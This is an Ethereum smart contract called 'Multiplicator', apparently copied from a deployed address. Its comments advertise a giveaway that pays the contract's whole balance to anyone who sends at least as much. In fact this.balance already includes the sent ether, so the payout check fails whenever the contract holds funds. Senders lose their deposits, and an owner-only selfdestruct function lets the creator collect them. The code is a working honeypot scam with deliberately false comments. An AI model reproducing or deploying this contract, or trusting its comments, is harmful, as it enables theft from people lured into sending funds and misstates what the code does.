/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Multiplicator at 0xD7e3C6d99BC2CcdB6FE54B8a5888D14319e65C36
*/
contract Multiplicator
{
        //Gotta be generous sometimes
        
        address public Owner = msg.sender;
        mapping (address => bool) winner; //keeping track of addresses that have already benefited
        


        function multiplicate(address adr) public payable
        {
            
            if(msg.value>=this.balance)
            {
                require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy 
                winner[msg.sender] = true; 
                adr.transfer(this.balance+msg.value);
            }
        }
        
        function kill() {
            require(msg.sender==Owner);
            selfdestruct(msg.sender);
         }
         
    //If you want to be generous you can just send ether to this contract without calling any function and others will profit by calling multiplicate
    function () payable {}

}